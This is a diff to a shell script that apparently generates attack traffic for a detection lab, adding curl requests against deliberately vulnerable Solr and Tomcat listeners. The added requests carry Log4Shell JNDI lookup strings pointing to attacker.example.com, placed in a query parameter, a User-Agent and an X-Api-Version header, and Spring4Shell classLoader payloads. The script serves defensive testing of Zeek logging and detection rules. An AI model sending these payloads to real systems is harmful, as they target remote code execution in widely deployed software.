@@ -1036,4 +1036,34 @@ ss = ctx.wrap_socket(s, server_hostname="1.1.1.1")
 ss.close()
 ' 2>/dev/null || true
 
+# ---------- Vulhub-targeted exploitation ----------
+# These hit the deliberately-vulnerable listeners installed by
+# victim_setup.sh: Log4Shell via Solr on :8983, Spring4Shell via
+# Tomcat on :8080. Unlike the pattern-only probes earlier in the
+# script (which just emit signatures against nginx :80), these reach
+# real Log4j / Spring instances so Zeek captures request+response in
+# http.log and detect-webapps can identify the stack.
+echo "[33] Vulhub-targeted exploitation (Log4Shell + Spring4Shell)"
+
+# Log4Shell — Solr admin-cores endpoint. The JNDI lookup will fail to
+# resolve (no attacker LDAP server in the isolated VPC) but the request
+# reaches Log4j's lookup path, which is what the rule and Zeek parser
+# both need.
+timeout 10 curl -s -o /dev/null --max-time 5 \
+  "http://${VICTIM_IP}:8983/solr/admin/cores?action=\${jndi:ldap://attacker.example.com/exploit}" \
+  || true
+timeout 10 curl -s -o /dev/null --max-time 5 \
+  -H 'User-Agent: ${jndi:ldap://attacker.example.com/ua}' \
+  "http://${VICTIM_IP}:8983/solr/" || true
+timeout 10 curl -s -o /dev/null --max-time 5 \
+  -H 'X-Api-Version: ${jndi:ldap://attacker.example.com/hdr}' \
+  "http://${VICTIM_IP}:8983/solr/admin/info/system" || true
+
+# Spring4Shell — classLoader manipulation against Tomcat.
+timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
+  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di' \
+  "http://${VICTIM_IP}:8080/" || true
+timeout 10 curl -s -o /dev/null --max-time 5 \
+  "http://${VICTIM_IP}:8080/?class.module.classLoader.URLs%5B0%5D=0" || true
+
 echo "=== Attack simulation complete ==="
